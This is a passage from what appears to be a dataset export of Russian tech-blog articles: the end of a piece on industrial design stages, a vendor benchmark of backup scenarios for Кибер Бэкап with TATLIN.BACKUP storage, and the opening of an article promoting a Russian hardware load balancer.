и их задача только сидеть и рисовать 3D модельки, ведь больше они ничего не умеют. Тема эта довольно обширная и тянет на отдельную статью, так что перейдем к следующему куску.4. Аппаратная часть (Hardware)Это всё, что связано с начинкой вещи и компонентами, которые обеспечивают ее работоспособность. Обычно относится к электронным устройствам. В смартфоне, например, к аппаратной части можно отнести экран, печатную плату, динамики, аккумулятор и т. д.От аппаратной части зависит внешний вид устройства. Поэтому в ходе ее разработки дизайнеры и инженеры работают вместе. Если, например, по юзабилити важно, чтобы кнопка была по центру, то об этом должен знать схемотехник, чтобы было предусмотрено место на плате заранее. Если кнопку на плате расположить так нельзя, то начинаются компромиссы между дизайном и схемотехникой.Дизайн иногда разрабатывается без детального учета начинки. Особенно часто это происходит у стартаперов. Денег мало, а впечатлить инвесторов надо. А когда доходит до реализации, то начинает вылазить много проблем. И обычно за них отдувается команда инженеров.В общем тут просто важно знать, что очень круто, когда дизайн и инженерная проработка идут вместе. Таким образом, можно сделать красивое, удобное и отлично работающее устройство.5. Бизнес и маркетингЦель бизнеса — прибыль. Причем такая, чтобы вместе с ней и репутация укреплялась, и перспективы на масштабирование были. Поэтому этот кусок и про маркетинг тоже.Для промдизайнера важно знать, что разрабатывается с точки зрения бизнеса и маркетинга — цели, ограничения по ресурсам и срокам, какие целевая аудитория и позиционирование продукта.Про цели и ресурсы все понятно, а вот про сроки… Со стороны промдизайнеров справедливо слышны недовольства относительно сроков, потому что всегда хочется делать все продумано и супер качественно. Но здесь и бизнес тоже можно понять. Если выпустить продукт не ко времени, то бизнес рискует упустить момент и потерять прибыль, долю рынка и так далее. И это вечное перетягивание каната между сроками и качеством вполне нормально.Бизнес устанавливает время на разработку и обычно не в большую сторону, что приводит к сжатию сроков на разработку и запуск продукта. Чтобы успевать к заданному сроку чаще всего сжимается этап исследования, так как обычно считается, что «мы и так знаем как надо». В этом случае принятие решений на себя берет высокоуровневый специалист — минимум уровня senior. На основании своего опыта при недостатке времени он способен не проводя глубокие исследования, экономить время и делать наиболее правильные решения.Тем не менее здесь обязательно добавлю слова про важность исследований. Хороший подход в разработке дизайна — это не додумывать и предполагать за других, а узнать все как следует и действовать исходя из проверенных данных. Люди разные, люди удивительны.Сроки и деньги — это важная часть бизнеса для его успешного существования, поэтому нормально, что временами приходится делать проект быстро, схлапывая некоторые этапы разработки. Мир, дружба, жвачкаМаркетинг — это про бренд. Его представление и правила подачи и поведения. Промышленный дизайнер должен учитывать видение бренда и мягко проецировать это видение на разрабатываемую вещь. Например, было бы странно, если бы дружелюбный бренд, например Google, выпускал бы продукты в стиле бренда Marshall, потому что Marshall — это больше про творческое бунтарство.Промдизайнеру важно уметь правильно чувствовать бренд и уметь его проецировать на разрабатываемые вещи.6. ПроизводствоВажный кусок, при котором, если процессы были поставлены неправильно, придя с разработанным дизайном к фабрике можно «внезапно» узнать, что это нельзя реализовать, либо будет нецелесообразно дорого. Это требует дополнительных этапов и ресурсов на переработку, где промдизайнеру приходится губу закатывать: где‑то дизайн делать более цельный (вместо двух деталей корпуса сделать один), где‑то пересмотреть сборку, материалы и так далее.Правильно налаженный процесс — когда производство подключается уже на этапе концепт дизайна, когда только начинаются работы по детальной разработке дизайна и конструкции, когда только начинают придумываться решения, влияющие на производство. Вместе с консультациями по производству на ранних этапах удается предупредить сложные и дорогие технологические решения.В бизнесе важно, чтобы производство было по возможности дешевле и быстрее. Бизнес выкручивается по‑разному и часто так, как ему не хотелось бы. Например, бизнес хочет выпустить устройство с какой‑то крутой фичей (какая‑то особенная функция у продукта), но прямо сейчас становится понятно, что производство этой фичи не успевается ко времени (либо стоит очень дорого). Здесь может быть решено, что фича переносится на следующую версию устройства. И тут бизнес рискует, потому что время идет и для следующей версии эта фича может быть уже не нужна.7. ЭкологияЭто про устойчивый дизайн, про минимизацию вреда окружающей среде, про повторное использование материалов, продумывание утилизации и переработки.Промдизайнеру важно учитывать этот кусок. Ведь земля у нас одна и профессия, которая занимается заполнением земли различными вещами, должна делать это максимально безвредно для окружающей среды.8. ПсихологияПсихология — это про ассоциации у человека, про триггеры. И не зря я разместил этот последний кусок рядом с пользовательским опытом и стайлингом. Потому что это очень накладывающиеся друг на друга куски.Следуй за черным зайцемНапример, чёрный цвет — серьезный, стильный, бизнесовый. Белый пушистый плюшевый заяц будет вызывать одни ассоциации и, соответственно, эмоции, а такой же плюшевый заяц, только черный, будет вызывать другие ассоциации. И иногда круто играть на подобных эффектах делая черных зайцев вместо белых.Психология человека сложная и формируется под воздействием множества факторов. И здесь, чем лучше промдизайнер разбирается в ассоциациях и триггерах аудитории для которой он разрабатывает дизайн, тем лучше.Как съедается  пиццаДавайте посмотрим какие кусочки и когда нужно съедать.Казалось бы, что логичнее брать кусочки последовательно, тщательно и медленно прожевывая каждый по отдельности. Но это не так! В процессе прохождения этапов разработки, промдизайнеру необходимо брать сразу несколько кусков. Главное, чтобы влезло.Этапы промдизайна1. ДрафтСамое начало проекта начинается с генерации идей на чистую голову. Промдизайнер генерит идеи, как только общая задача становится ясна. На этом этапе, используя насмотренность и опыт, в свободном режиме можно придумать довольно интересные идеи, пока голова еще не заполнена всевозможными ограничениями. Эти идеи обычно переносятся на бумагу в виде заметок и скетчей.С первого же этапа учитываются 5 кусочков. Отличному промдизайнеру идеи приходят сразу с учетом предполагаемого опыта пользователя, его ассоциаций и триггеров. Продумываются стиль и экология с учетом установок бизнеса и маркетинга.2. ИсследованияЭтап исследования призван минимизировать неизвестные, которые есть перед этапом дизайна. Чтобы решения были основаны на максимально проверенных данных без додумывания и предположений. Здесь исследуются целевая аудитория, сценарии использования, конкурентные решения и насколько хорошо они воспринимаются рынком, гипотезы продуктовой команды и многое другое.По итогу имеется структурированный документ по которому формируются рекомендации для разработки дизайна.3. ТЗ на дизайнРекомендации попадают в документ с финальными требованиями к дизайну. Также, на этом этапе уточняются моменты, которые были упущены в изначальном запросе на дизайн. Особенно много моментов всплывает после проведенных исследований.4. Скетч дизайнВсе еще учитывая 5 кусочков, добавляются еще 2 про конструкцию и аппаратную часть. С максимумом известных данных промдизайнер начинает обдуманно придумывать различные варианты дизайна. Параллельно идут обсуждения с командами инженеров, ведь на этом этапе разрабатываются множество концептов с идеями не только по UX и внешнему виду, но и по конструкции и компоновке.5. ДизайнМножество концептов отбираются и детализируются. Добавляется еще один кусочек про производство. Это максимально сложный и объемный этап со всеми 8 кусочками! И промдизайнеру нужно грамотно состыковать между собой их все, чтобы в итоге получился наикрутейший дизайн.На выходе имеется базовый набор из 3D моделей, визуализации, документа CMF и макетов.6. КонструированиеС началом этого этапа промдизайнеру уже не нужно думать о стайлинге и позиционировании. Эти кусочки завершены и зафиксированы в дизайне.Этот этап углубляется в цели довести дизайн до производства. Дизайн правильно разделяется по деталям корпуса, продумываются сопряжения (как детали будут между собой стыковаться) и методы фиксации, как детали будут производиться и как потом собираться.В зависимости от того в какой компании работает промдизайнер он может этим заниматься, либо сам, что является очень крутым скилом, либо участвовать в этом процессе контролируя изменения влияющие на дизайн.Главная задача довести дизайн до производства и чтобы это не было так долго и дорого. На выходе базовый набор состоит из прототипов (для тестирования конструкторских решений) и 3D моделей.7. Подготовка к производствуВажнейший этап с проверкой и подготовкой всего необходимого для запуска производства. Фабрика проверяет, что все технологично и можно произвести. Почти всегда с первого раза невозможно произвести то, что отдается фабрике, поэтому этот этап состоит из долгих взаимодействий между бизнесом и фабрикой. Этапы конструирования, а иногда и дизайна, прогоняются повторно и так по циклу, пока все не будет приведено к приемлемому технологичному виду.На выходе базовый набор по итогу состоит из 3D моделей, чертежей, CMF и прочей документации.8. ПроизводствоНа этом этапе редко, но могут быть срочные правки прямо незадолго до запуска станков. Ну а если все хорошо, то промдизайнеру остается только ждать и предвкушать.ЗаключениеВ этой статье я рассказал про 8 атрибутов из которых состоит промышленный дизайн и из каких этапов он состоит.Вы заглянули в закулисье работы промдизайнера и теперь понимаете, что дизайнеры не просто рисуют, а проделывают комплексную работу, чтобы прийти к лучшему UX.Сейчас много ИИ, которые, скажем откровенно, выполняют работу дизайнера намного быстрее и дешевле. Есть мнение, что дизайнерская работа скоро вымрет. И ведь действительно такое возможно, но не во всех направлениях.Предлагаю подумать и написать в комменатриях, какие, например, из 8 кусочков промдизайн пиццы сожрёт ИИ.Далее, планиурю серию статей, в которых подробно будут рассказаны кусочки пиццы и за одно, как в них участвует ИИ."
65,Более 4 000 ГБ за 11 минут: тестируем три сценария резервного копирования с Кибер Бэкап и TATLIN.BACKUP,YADRO,Тут про железо и инженерную культуру,0,"Программное обеспечение, Аппаратное обеспечение, Связь и телекоммуникации",2025-04-09,"В формуле идеального решения для резервного копирования данных enterprise-класса много переменных. Одна из ключевых — производительность решения, включая скорость копирования, нагрузку на сеть и потребление вычислительных ресурсов хранилища и источника данных. Инженеры компаний YADRO и Киберпротект протестировали совместную работу системы резервного копирования Кибер Бэкап и системы хранения данных TATLIN.BACKUP в трех сценариях сохранения резервных копий виртуальных машин: с inline-дедупликацией, по протоколу NFS и агентом Tboost на узле хранения. Поделимся результатами тестирования совместимого решения, а заодно предметно поговорим об организации правильной архитектуры с учетом особенностей конкретной инфраструктуры. СодержаниеКоротко про систему хранения данных TATLIN.BACKUPВозможности системы резервного копирования Кибер БэкапТри сценария резервного копированияТестирование вариантов организации резервного копирования виртуальных машинЗаключениеТермины и определения в статьеАгент Кибер Бэкапа — модуль, который выполняет основные функции СРК при работе с защищаемыми объектами и резервными копиями:резервное копирование,восстановление,репликация,очистка хранилищ;валидация резервных копий,просмотр хранилищ и устройств защиты,работа с платформами виртуализации,работа со снапшотами уровня СХД.Плагин TBoost — программная часть СХД TATLIN.BACKUP. Он устанавливается на стороне клиента — агента Кибер Бэкапа, который работает с хранилищем резервных копий. Позволяет обмениваться данными с хранилищем в оптимизированном формате по протоколу T-BOOST. Протокол T-BOOST — протокол работы с хранилищем резервных копий, который выполняет функцию дедупликации и компрессии перед передачей резервных копий в хранилище.Коротко про систему хранения данных TATLIN.BACKUPВ 2024 году компания YADRO выпустила на рынок специализированную систему хранения данных TATLIN.BACKUP. Это решение с глобальной в рамках СХД inline-дедупликацией и сжатием служит для хранения и восстановления больших массивов резервных копий объемом вплоть до 690 терабайт (до дедупликации и сжатия). Система работает на базе дисковых модулей, контроллера, программного обеспечения и других разработок YADRO, например T-RAID. Команда TATLIN.BACKUP регулярно добавляет новые возможности в СХД, актуальную информацию можно найти на странице продукта.Как устроен T-RAID — RAID-массив в СХД TATLIN: читайте в статье Вячеслава Пачкова, ведущего инженера по разработке ПО в департаменте СХД YADRO.   В отличие от обычных СХД, TATLIN.BACKUP относится к классу PBBA (Purpose-Built Backup Appliance). Такие устройства созданы специально для работы с резервными копиями и учитывают их специфику. TATLIN.BACKUP можно интегрировать практически с любой популярной системой резервного копирования. Одна из ключевых особенностей СХД — технология дедупликации с алгоритмом FastCDC, который разбивает данные на блоки переменной длины. Он решает проблему смещения границ (boundary-shift problem) в процессе добавления новых данных в файл. Также алгоритм помогает заметно повысить производительность системы за счет высокой скорости обработки потока байтов. Дедупликация может выполняться:На источнике. Данные обрабатываются в режиме реального времени перед передачей по сети на специальном агенте Tboost.На СХД. Система осуществляет inline-дедупликацию после получения данных по сети.Последняя версия TATLIN.BACKUP 1.2 с протоколом T-BOOST поддерживает оба типа дедупликации, а 1.1 — только на СХД. Давайте разберемся, чем отличаются эти версии СХД.TATLIN.BACKUP v1.1. Здесь дедупликация происходит на самом контроллере. Система разбивает все поступающие по сети данные на блоки и ищет их дубликаты среди уже сохраненных. Схема дедупликации в TATLIN.BACKUP v1.1Дедупликация использует вычислительные мощности контроллера, на который приходят все данные, независимо от их уникальности. Даже если во входящем потоке всего 10% уникальных данных, контроллеру все равно приходится обрабатывать весь поток. Также по сети приходится передавать полный массив данных для обработки, а это увеличивает нагрузку на нее. TATLIN.BACKUP v1.2. В этой версии реализован протокол T-BOOST, который решает ряд задач. Основная из них — обеспечение inline-дедупликации на машине-хосте, где работает агент Tboost по этому протоколу.Как работает протокол T-BOOST в TATLIN.BACKUP v1.2На контроллере TATLIN.BACKUP используется файловая система TBFS с дедупликацией, компрессией и контролем целостности данных. В TBFS встроен сервис Tboost, которые обслуживает запросы агентов Tboost на проверку уникальности и сохранение блоков данных.Благодаря новому протоколу снижается нагрузка на сеть, поскольку мы передаем только уникальные данные. Сеть разгружается пропорционально доле неуникальных данных в исходном массиве. Также мы разгружаем контроллер, так как дедупликация в случае использования протокола T-BOOST происходит на хосте. Однако работа агента требует достаточной вычислительной мощности от машины, на которой он установлен.Что такое дедупликация, как она работает в TATLIN.BACKUP и какие задачи решает T-BOOST, читайте в статье.   В новые версии TATLIN.BACKUP мы планируем добавить public Rest API, снапшоты и репликацию данных, а также SDK T-BOOST для удобной интеграции в распространенные системы резервного копирования. Подробнее про развитие системы можно узнать из дорожной карты. Возможности системы резервного копирования Кибер БэкапКибер Бэкап — система резервного копирования с централизованным управлением, разработанная компанией Киберпротект. Решение подходит как для небольших офисов, так и для крупных компаний.СРК обеспечивает резервное копирование и восстановление систем разных типов: физических и виртуальных машин, приложений, а также баз данных. Помимо резервного копирования и восстановления, СРК включает ряд дополнительных функций. Сюда относятся механизмы управления нагрузкой и обеспечение возможности восстановления данных: в том числе механизмы репликации резервных копий, которые позволяют реализовать правило 3–2–1, а также функции проверки резервных копий на возможность восстановления из них.Кибер Бэкап поддерживает отечественные и зарубежные системы: проприетарные и свободно распространяемые. Экосистема технологических партнеров, в которую входит и компания YADRO, позволяет обеспечивать совместимость с наиболее востребованными российскими операционными системами, платформами виртуализации, СУБД, приложениями, облачными средами и аппаратными комплексами.Кибер Бэкап позволяет выполнять резервное копирование операционных систем, дисков, томов, папок и файлов на серверах и рабочих станциях под управлением Windows или Linux, включая наиболее распространенные российские дистрибутивы. Согласованность данных и оптимизации использования ресурсов достигается поддержкой создания моментальных снимков с использованием VSS для Windows или LVM Snapshot и Snap API для Linux. СРК умеет защищать платформы виртуализации как на уровне гипервизора, в безагентном режиме, так и с помощью агентов, которые устанавливаются внутри гостевых ОС виртуальных машин.Защита СУБД может быть реализована агентами, которые обеспечивают максимальное взаимодействие с сервером СУБД, использовать API и библиотеки вендора. Резервное копирование с поддержкой приложений нужно для того, чтобы обеспечить возможность восстановления данных без восстановления всей машины. Более подробно о защите СУБД мы уже писали, как и о реализации поддержки PostgreSQL.Кибер Бэкап обеспечивает резервное копирование и гранулярное восстановление данных отечественных и зарубежных бизнес-приложений. Для этого используются специальные агенты, которые устанавливаются на хост почтового сервера или на удаленный хост.О ключевых новинках в Кибер Бэкапе 17.2 читайте в статье, а в этой публикации вы найдете обзор возможностей версии 17.1. Узнать о новых возможностях Кибер Бэкапа 17.3 можно на вебинаре, который пройдет 17 апреля.Интеграция TATLIN.BACKUP и Кибер БэкапИнтеграция СРК Кибер Бэкап с TATLIN.BACKUP предназначена для разделения обязанностей и максимального использования плюсов каждой системы. Архитектурно правильное решение — поручить СРК управлять процессом резервного копирования/восстановления (оркестрация задач, планирование, чтение защищаемых данных и формирование архивов, которые будут размещены на системе хранения, слежение за версиями) и обеспечивать консистентность данных, например, создавать согласованные снапшоты баз данных или виртуальных машин. Хранение больших объемов резервных копий лучше доверить специализированному хранилищу. Такой подход позволяет достичь баланса: СРК будет сфокусирована на корректном создании резервных копий, а СХД — на их надежном хранении, дедупликации и компрессии. Три сценария резервного копированияИнженеры Киберпротекта и YADRO протестировали три сценария совместной работы решений. Два из них различаются способом использования протокола T‑BOOST, а в третьем протокол не используется. Все сценарии работоспособны, что подтверждает сертификат совместимости.Сценарий 1. Стандартный режим с NFS-сервером: протокол T‑BOOST не используется В этом сценарии данные без сжатия передаются по сети в хранилище TATLIN.BACKUP, где происходит дедупликация и компрессия. Этот сценарий подходит для случаев, когда нужно сберечь вычислительные ресурсы хоста: CPU и RAM, требуемые агенту Tboost для дедупликации и компрессии данных.Схема совместной работы Кибер Бэкапа и TATLIN.BACKUPОсобенность такого сценария — существенная нагрузка на сеть, ведь по ней передаются неуникальные и несжатые данные. Также контроллер TATLIN.BACKUP использует собственные вычислительные ресурсы для дедупликации и компрессии.Сценарий 2. Дедупликация на источниках: агент Tboost работает на защищаемых хостахДедупликация и компрессия производятся на хостах с агентом Кибер Бэкапа, вычислительной мощности которых достаточно для корректной работы агента Tboost. Схема совместной работы Кибер Бэкапа и TATLIN.BACKUPЭтот сценарий позволяет:снизить нагрузку на сеть; в хранилище передаются только уникальные и сжатые данные, а вместо уже записанных блоков передаются только их метаданные,освободить вычислительные мощности контроллера TATLIN.BACKUP переносом выполнения задач дедупликации и сжатия на хост.Сценарий 3. Агент Tboost установлен на узлах хранения Кибер БэкапаЭто гибридный сценарий, который позволяет сэкономить вычислительные ресурсы защищаемого хоста и снизить нагрузку на сеть: в хранилище передаются только уникальные данные.Схема совместной работы Кибер Бэкапа и TATLIN.BACKUPРезервные копии в полном объеме передаются по протоколам SMB/CIFS или NFS на локальный узел хранения, где установлен агент Tboost. Он выполняет дедупликацию и компрессию полученных данных, используя вычислительных мощности узла хранения. Затем сжатые и дедуплицированные данные передаются в хранилище TATLIN.BACKUP.Сценарий помогает сберечь вычислительные ресурсы хоста и контроллера TATLIN.BACKUP, а также снизить нагрузку на сеть. Как мы уже указывали выше, влияние inline-дедупликации на сетевую нагрузку и вычислительные мощности при использовании протокола T-BOOST зависит от доли неуникальных данных.Тестирование вариантов организации резервного копирования виртуальных машинДля оценки производительности резервного копирования специалисты YADRO и Киберпротекта развернули тестовый стенд на базе СРК Кибер Бэкап 17.2 и СХД TATLIN.BACKUP.M с протоколом T‑BOOST. Протестированы три сценария организации резервного копирования ВМ, в одном из которых реализованы два варианта на узлах хранения.Для каждого сценария рассмотрим архитектуру и параметры стенда, объем переданных данных, время создания резервной копии и проанализируем причины отличий — узкие места и влияние нагрузки. Конфигурация тестового стенда Аппаратная частьВ качестве инфраструктуры использовали четыре сервера ESX, которые обозначены как ESX1–ESX4. Первичное хранилище для рабочих дисков виртуальных машин — система TATLIN.UNIFIED с пулом SSD, подключенная по iSCSI через 4×25 Гбит/с Ethernet​.Подключение каждого логического диска LUN`а с СХД к хостам виртуализации выполнено по 8 путям с режимом балансировки Round Robin чтобы обеспечить эффективное распределение I/O по всем 25-гигабитным каналам. Целевое хранилище для резервных копий — TATLIN.BACKUP с поддержкой дедупликации. У хранилища есть агрегированный канал 4×25 Гбит/с, при этом интерфейсы объединены в bond, суммарно до 100 Гбит/с.Скрытый текстФизическая схема стендаСХД TATLIN.UNIFIED: один пул SSD и 4 порта iSCSI по 25 Гбит/c EthernetСХД TATLIN.BACKUP4 порта по 25 Гбит/с Ethernet объединены в bondТестовый стендДля оценки результатов интеграции КиберБэкапа и TATLIN.BACKUP инженеры выбрали конфигурацию стенда, которая наиболее распространена у заказчиков — виртуальные машины на базе гипервизора VMware.На каждом из четырех серверов ESX развернуто 8 тестовых виртуальных машин — итого их 32. Конфигурация каждой: 8 vCPU, 8 ГБ RAM и два диска — системный диск на 20 ГБ и дополнительный сгенерированный диск на 209 ГБ​. Виртуальные машины размещены в хранилище на томах с TATLIN.UNIFIED и SSD POOL для обеспечения высокой скорости чтения.Схема настройки виртуального стенда для всех тестовСкрытый текстСерверы ESX:ESX1.kb.lab — VEGMAN R120 G2 Server / 021123063C,ESX2.kb.lab — VEGMAN R120 G2 Server / 0212230150,ESX3.kb.lab — VEGMAN S220 Server / 020421002D,ESX4.kb.lab — Server YADRO X2-105 / 010523006B.Виртуальные машины, размещенные на томах с СХД TATLIN.UNIFIED и SSD POOLУ каждого Datastore — 8 активных путейПолитика мультипасинга — Round RobinПО для резервного копированияВ качестве системы управления резервным копированием использовали Кибер Бэкап 17.2, развернутый в виртуальной машине с 16 vCPU и 32 ГБ RAM. Для сценариев с узлами хранения использовали узел хранения также в виртуальной машине — 16 vCPU, 32 ГБ RAM с ОС Linux и сетевым адаптером VMXNET3. На нее установили агент Кибер Бэкап и агент Tboost v1.2.1 (настроен open_direct_io_mode=true)​.В сценариях могут использоваться один или несколько таких узлов. Сеть передачи данных — 25 Гбит/с Ethernet. Для всех ВМ активирован драйвер VMXNET3, чтобы устранить возможные ограничения пропускной способности виртуального NIC.Резервное копирование по протоколу NFSВ этом сценарии в качестве целевого хранилища выступает сервер TATLIN.BACKUP, который подключен по протоколу NFS. В Кибер Бэкапе сконфигурировано четыре NFS-хранилища​ и настроены четыре плана резервного копирования, как и в первом сценарии: для каждой группы из 8 ВМ на своем NFS-ресурсе. Агенты Tboost в данном сценарии не используются — передача данных осуществляется напрямую с хостов через NFS, то есть без дедупликации на источнике.Скрытый текстСхема резервного копированияВ плане резервного копирования указываются четыре NFS-хранилищаРезультатыЧтение повторной резервной копии на источнике TATLIN.UNIFIEDЗапись на TATLIN.BACKUP. Повторная запись — дедупликация на источникеОбъем переданных Кибер Бэкапом данных:резервная копия каждой ВМ занимает в среднем 131 ГБ,четыре операции резервного копирования — по 8*131*4 = ~ 4 192 ГБ.Итого: полное копирование ~ 4 192 ГБ за 15–16 минут. Резервные копии создавались консистентно на уровне ВМ.Резервное копирование с помощью агента Кибер Бэкапа и агента Tboost внутри виртуальной машиныВ этом сценарии выполняется резервное копирование с дедупликацией на лету внутри каждой ВМ. В каждую из 32 виртуальных машин установлены агенты Кибер Бэкапа, а также агенты Tboost. Каждый агент сохраняет резервную копию в локальную папку, подключенную к целевому хранилищу через T‑BOOST (точка монтирования /mnt/esxboost)​. В качестве хранилища резервных копий в Кибер Бэкапе указано 32 хранилища — по числу ВМ.Для упрощения администрирования использован один план резервного копирования, включающий все машины. При его запуске бэкап выполняется параллельно для всех 32 ВМ.Скрытый текстСхема резервного копированияМы использовали один план резервного копирования: копирование агентом СРК в локальную папку, где подключен агент Tboost через /mnt/esxboostВ плане резервного копирования указывается 32 хранилища (по количеству агентов)РезультатыЧтение на источнике TATLIN.UNIFIEDГрафик показывает, что мы достигли ограничений оборудования: пропускной способности четырех портов Ethernet по 25 Гбит/с, через которые подключен диск TATLIN.UNIFIED к хостам виртуализации. Запись на TATLIN.BACKUP. Повторная запись — дедупликация на источникеСовокупный объем данных, переданных Кибер Бэкапом для полного резервного копирования всех ВМ, аналогичен первому сценарию: ~ 4 192 ГБ (32 × 131 ГБ).Параллельно выполнялись 32 операции резервного копирования. Время выполнения операций составило от 8 до 11 минут.Скрытый текстИтого: полно копирование ~ 4 192 ГБ за 11 минут. Резервные копии создавались консистентно на уровне ОС.Два варианта организации резервного копирования на узлах хранения в виртуальной машинеВ этом сценарии агент Tboost установлен на узлах хранения Кибер Бэкапа:вариант 1: четыре узла хранения, которые установлены внутри виртуальных машин — на каждом хосте ESXi поднят свой узел хранения с агентом Tboost для резервного копирования ВМ этого хоста,вариант 2: один узел хранения на все ВМ — все ВМ копируются через единый узел хранения, установленный внутри виртуальной машины с агентом Tboost и один поток на хранилище.Вариант 1. Резервное копирование с помощью Virtual Appliance (агента Кибер Бэкапа для среды виртуализации) и узлов хранения в виртуальной машинеВ этом варианте для каждого хоста ESX выделен свой узел хранения в виртуальной машине с агентом Tboost. В консоли управления Кибер Бэкап настроено 4 хранилища (каждое — на соответствующем узле хранения) и создано 4 плана резервного копирования — по одному на каждый хост ESX. Таким образом, резервные копии ВМ на каждом хосте отправляются на свой узел хранения. Расписание настроено так, чтобы все четыре плана резервного копирования запускались одновременно, суммарно выполняя параллельное копирование сразу 32 ВМ (по 8 потоков через каждый узел хранения)​.Скрытый текстСхема резервного копированияВ Кибер Бэкапе задано четыре хранилища на базе узла храненияПлан резервного копирования, где для каждого хоста ESX создается резервная копия на свой узел храненияПлан резервного копированияПлан резервного копирования одновременно выполняет резервное копирование 32 ВМСхема резервного копированияРезультатыЧтение на источнике TATLIN.UNIFIEDВ этом сценарии тест также показал, что мы уперлись в ограничение оборудования: пропускную способности четырех портов Ethernet по 25 Гбит/с. Запись на TATLIN.BACKUP. Повторная запись — дедупликация на источникеСкрытый текстОбъем переданных Кибер Бэкап данных Время выполнения резервного копированиярезервная копия каждой ВМ занимает в среднем 131 ГБ,с одного хоста ESX передается 8*~131 = ~1 048 ГБ,с четырех хостов ESX передается 32*~131 = ~4 192 ГБ.Итого: полное копирование ~4 192 ГБ (32 ВМ) заняло 16 минут​. Резервные копии создавались консистентно на уровне ВМ.Вариант 2. Резервное копирование с помощью Virtual Appliance (агента Кибер Бэкапа для среды виртуализации) и одного узла хранения в виртуальной машинеВ этом сценарии задействован единственный узел хранения в виртуальной машине с T‑BOOST, общий для всех хостов. В плане резервного копирования указано одно хранилище на базе этой ВМ. Один план резервного копирования, включающий все 32 ВМ, направляет потоки данных на данный узел​. План запускается с максимальным параллелизмом (32 потока через один узел).Скрытый текст Схема резервного копированияХранилища на базе узла хранения в виртуальной машине с TboostПлан резервного копирования для копирования 32 ВМ на один узел хранения. План готов обеспечить одновременное резервное копирование всех ВМРезультатыЧтение на источнике TATLIN.UNIFIEDЗапись на TATLIN.BACKUP. Повторная запись — дедупликация на источникеОбъем переданных Кибер Бэкапом данных:резервная копия каждой ВМ занимает в среднем 131 ГБ,с четырех хостов ESX передается 32*~131 = ~4 192 ГБ.Скрытый текстВремя работы резервного копирования от 31 до 32 минут (самое быстрое копирование ВМ на том же хосте ESX)Итого: полно копирование ~4 192 ГБ за 32 минуты. Резервные копии создавались консистентно на уровне ВМ.ЗаключениеКак видно из результатов тестов, совместное использование TATLIN.BACKUP с T‑BOOST и Кибер Бэкапа 17.2 позволяет эффективно обрабатывать резервные копии размером в несколько терабайт за минуты, при условии правильной организации архитектуры. Выводы, которые мы сделали из результатов тестов:тесты хорошо отработали в конфигурации с использованием отдельного узла хранения с установкой агента Tboost на каждый сервер виртуализации,наилучший результат тесты показали при установке агента Tboost на каждый виртуальный сервер, но этот сценарий достаточно сложный с точки зрения администрирования,наконец сценарий, который позволит вам получить ускорение в обработке резервных копий и сократить расходы на их хранение без существенного усложнения администрирования системы — использование одного узла хранения и установка агента Tboost на несколько серверов виртуализации.Для достижения наилучших результатов следует соотнести выбранный сценарий копирования с возможностями сети и сервера. Распределяя потоки между узлами или агентами, мы устраняем узкие места и добиваемся оптимальной скорости без избыточной нагрузки на отдельные компоненты системы. Такой подход позволяет подобрать решение под требования конкретной инфраструктуры, чтобы обеспечить как высокую скорость резервного копирования, так и рациональное использование ресурсов.Киберпротект и YADRO продолжают работать над повышением функциональности и производительности совместного решения. У нас уже есть внутренние планы по развитию, которые гарантировано приведут к улучшениям в будущих версиях продуктов. Следите за нашими материалами и анонсами.Хотите узнать больше о TATLIN.BACKUP и Кибер Бэкапе? Подключайтесь к вебинару 10 апреля, в 13:00 МСК."
66,Первый российский аппаратный балансировщик нагрузки DS Proxima,«Цифровые решения»,Компания,0,"Аппаратное обеспечение, Связь и телекоммуникации, Информационная безопасность",2025-04-09,"Цифровизация перестала быть выбором — теперь это вопрос конкурентоспособности. Российский финтех, госуслуги и ритейл не просто догоняют мировых лидеров — они формируют новые стандарты цифровой зрелости, на которые ориентируются и другие сектора экономики.Однако за внешней эффективностью цифровых сервисов скрывается серьёзный технологический вызов — инфраструктура не всегда успевает за взрывным ростом нагрузки. Проблема масштабирования становится особенно очевидной в пиковые моменты:Запросы к маркетплейсам во время распродаж могут вырастать в десятки раз;Сервисы госуслуг должны обрабатывать десятки тысяч запросов в секунду.В этих условиях балансировщики нагрузки превращаются из вспомогательного инструмента в критический компонент инфраструктуры — они становятся ключевым элементом системы масштабирования.Увеличение серверных мощностей необходимо не только для поддержания доступности сервисов, но и для обеспечения информационной безопасности. Современные системы защиты, например, межсетевые экраны нового поколения (NGFW) и межсетевые экраны веб-приложений (WAF), требуют эффективного масштабирования, поскольку анализируют каждый пакет данных на уровне приложений (L7). Рост объёма трафика и сложности запросов делает это особенно критичным. Балансировщики нагрузки помогают распределять потоки данных, предотвращая снижение производительности систем защиты и исключая их превращение в «бутылочное горлышко» даже при пиковых нагрузках.Работа балансировщиков нагрузки часто остаётся незаметной, пока сервис функционирует без сбоев. Однако их значение особенно ярко проявляется в критических ситуациях, ведь надёжность цифровых сервисов — это не просто технический параметр, а прямой фактор бизнес-эффективности:Для онлайн-банкинга час простоя ведет к потере десятков миллионов рублей;Маркетплейсы во время крупных распродаж, таких как Black Friday, могут терять сотни миллионов рублей прибыли.Таким образом, балансировщики нагрузки выполняют не только техническую, но и экономическую функцию, минимизируя риски дорогостоящих простоев. Они обеспечивают бесперебойную работу даже при выходе из строя отдельных серверов.Как выбрать балансировщик нагрузки в новых реалиях?Почему продолжение использования западных балансировщиков — это игра с огнём?Ведущие западные вендоры балансировщиков нагрузки (F5, Citrix NetScaler, Kemp Technologies и др.) полностью прекратили поддержку своих решений в России в 2022 году. Однако многие компании продолжают их использовать, находя неофициальные способы обновления. Такой подход содержит ряд фундаментальных рисков:Серый импорт создает проблему качества — оборудование часто поставляется бывшим в употреблении или отремонтированным, что ставит под вопрос его надежность;Лицензионная неопределенность — компании не могут быть уверены, что приобретенные ключи активации будут работать стабильно и не будут заблокированы;Безопасность под вопросом — отсутствие официальных обновлений оставляет критические уязвимости незакрытыми, создавая постоянную угрозу.Рано или поздно от этих решений придётся отказаться — вопрос лишь в том, что станет триггером: очередная критическая уязвимость, санкционное давление или требования регуляторов.Open-source не панацея: почему бизнесу нужны предсказуемые решения?Open-source решения, такие как NGINX и HAProxy, теоретически могут заменить западные балансировщики. Однако их использование сопряжено с существенными сложностями. Без команды квалифицированных DevOps- и сетевых инженеров, подобной тем, что работают в крупных IT-компаниях, внедрение и поддержка таких решений потребуют непропорционально больших ресурсов.Ключевая проблема open-source была точно сформулирована одним из заказчиков: «Я не хочу бесплатно, я хочу предсказуемо». Это отражает главный бизнес-запрос, который не могут гарантировать решения с открытым исходным кодом:Отсутствие предсказуемых сроков исправления багов — критические уязвимости могут оставаться 